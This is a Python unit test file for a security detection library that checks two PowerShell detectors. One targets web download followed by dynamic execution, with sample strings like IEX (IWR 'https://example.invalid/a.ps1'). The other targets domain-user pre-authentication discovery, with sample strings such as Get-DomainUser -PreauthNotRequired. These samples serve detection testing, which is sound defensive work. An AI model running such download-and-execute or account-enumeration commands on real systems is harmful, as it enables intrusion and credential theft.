from __future__ import annotations

from dataclasses import dataclass
import unittest

from tracesoc.detection.powershell_reconstructed import (
    PREAUTH_DISCOVERY_DETECTION_ID,
    WEB_EXECUTION_DETECTION_ID,
    detect_domain_user_preauth_discovery,
    detect_powershell_web_retrieval_execution,
)
from tracesoc.normalization.powershell_scriptblock import (
    ScriptBlockState,
)


@dataclass(frozen=True)
class DetectorInput:
    state: ScriptBlockState
    script_text: str | None
    parent_event_ids: tuple[str, ...]


def complete(
    text: str,
    *event_ids: str,
) -> DetectorInput:
    return DetectorInput(
        state=ScriptBlockState.COMPLETE,
        script_text=text,
        parent_event_ids=(
            event_ids
            or
            ("evt_parent_1",)
        ),
    )


def incomplete(
    text: str | None,
) -> DetectorInput:
    return DetectorInput(
        state=ScriptBlockState.INCOMPLETE,
        script_text=text,
        parent_event_ids=(
            "evt_parent_incomplete",
        ),
    )


class RealPowerShellBehavioralDetectionTests(
    unittest.TestCase
):
    def test_web_retrieval_dynamic_execution_matches_short_aliases(
        self,
    ) -> None:
        result = (
            detect_powershell_web_retrieval_execution(
                complete(
                    "IEX (IWR 'https://example.invalid/a.ps1')"
                )
            )
        )

        self.assertTrue(
            result.matched
        )

        self.assertEqual(
            result.detection_id,
            WEB_EXECUTION_DETECTION_ID,
        )

        self.assertEqual(
            result.reason_code,
            (
                "powershell_web_retrieval_"
                "dynamic_execution_observed"
            ),
        )

    def test_web_retrieval_dynamic_execution_matches_full_names(
        self,
    ) -> None:
        result = (
            detect_powershell_web_retrieval_execution(
                complete(
                    "Invoke-Expression "
                    "(Invoke-WebRequest "
                    "'https://example.invalid/a.ps1')"
                )
            )
        )

        self.assertTrue(
            result.matched
        )

    def test_web_retrieval_without_dynamic_execution_does_not_match(
        self,
    ) -> None:
        result = (
            detect_powershell_web_retrieval_execution(
                complete(
                    "Invoke-WebRequest "
                    "'https://example.invalid/a.ps1'"
                )
            )
        )

        self.assertFalse(
            result.matched
        )

        self.assertEqual(
            result.reason_code,
            "no_dynamic_execution_primitive",
        )

    def test_dynamic_execution_without_web_retrieval_does_not_match(
        self,
    ) -> None:
        result = (
            detect_powershell_web_retrieval_execution(
                complete(
                    "IEX $localScript"
                )
            )
        )

        self.assertFalse(
            result.matched
        )

        self.assertEqual(
            result.reason_code,
            "no_web_retrieval_primitive",
        )

    def test_web_detector_is_case_insensitive(
        self,
    ) -> None:
        result = (
            detect_powershell_web_retrieval_execution(
                complete(
                    "iWr 'https://example.invalid/a'; IeX $x"
                )
            )
        )

        self.assertTrue(
            result.matched
        )

    def test_web_detector_rejects_incomplete_reconstruction(
        self,
    ) -> None:
        result = (
            detect_powershell_web_retrieval_execution(
                incomplete(
                    "IWR 'https://example.invalid/a'; IEX $x"
                )
            )
        )

        self.assertFalse(
            result.matched
        )

        self.assertEqual(
            result.reason_code,
            "incomplete_script_block",
        )

    def test_web_match_carries_all_parent_event_lineage(
        self,
    ) -> None:
        result = (
            detect_powershell_web_retrieval_execution(
                complete(
                    "IWR 'https://example.invalid/a'; IEX $x",
                    "evt_a",
                    "evt_b",
                    "evt_c",
                )
            )
        )

        self.assertEqual(
            result.contributing_event_ids,
            (
                "evt_a",
                "evt_b",
                "evt_c",
            ),
        )

    def test_preauth_discovery_matches_behavioral_combination(
        self,
    ) -> None:
        result = (
            detect_domain_user_preauth_discovery(
                complete(
                    "Get-DomainUser "
                    "-PreauthNotRequired "
                    "-Properties distinguishedname"
                )
            )
        )

        self.assertTrue(
            result.matched
        )

        self.assertEqual(
            result.detection_id,
            PREAUTH_DISCOVERY_DETECTION_ID,
        )

        self.assertEqual(
            result.reason_code,
            "domain_user_preauth_discovery_observed",
        )

    def test_domain_user_query_without_preauth_selection_does_not_match(
        self,
    ) -> None:
        result = (
            detect_domain_user_preauth_discovery(
                complete(
                    "Get-DomainUser -Properties name"
                )
            )
        )

        self.assertFalse(
            result.matched
        )

        self.assertEqual(
            result.reason_code,
            "no_preauth_not_required_selection",
        )

    def test_preauth_text_without_domain_user_query_does_not_match(
        self,
    ) -> None:
        result = (
            detect_domain_user_preauth_discovery(
                complete(
                    "$property = 'PreauthNotRequired'"
                )
            )
        )

        self.assertFalse(
            result.matched
        )

        self.assertEqual(
            result.reason_code,
            "no_domain_user_query",
        )

    def test_preauth_detector_rejects_incomplete_reconstruction(
        self,
    ) -> None:
        result = (
            detect_domain_user_preauth_discovery(
                incomplete(
                    "Get-DomainUser -PreauthNotRequired"
                )
            )
        )

        self.assertFalse(
            result.matched
        )

        self.assertEqual(
            result.reason_code,
            "incomplete_script_block",
        )

    def test_preauth_match_carries_parent_event_lineage_and_bounded_claim(
        self,
    ) -> None:
        result = (
            detect_domain_user_preauth_discovery(
                complete(
                    "GET-DOMAINUSER "
                    "-PREAUTHNOTREQUIRED",
                    "evt_1",
                    "evt_2",
                )
            )
        )

        self.assertTrue(
            result.matched
        )

        self.assertEqual(
            result.contributing_event_ids,
            (
                "evt_1",
                "evt_2",
            ),
        )

        self.assertIn(
            "does not establish",
            result.rationale.casefold(),
        )

        web_result = (
            detect_powershell_web_retrieval_execution(
                complete(
                    "IWR 'https://example.invalid/a'; IEX $x"
                )
            )
        )

        self.assertIn(
            "does not establish",
            web_result.rationale.casefold(),
        )


if __name__ == "__main__":
    unittest.main()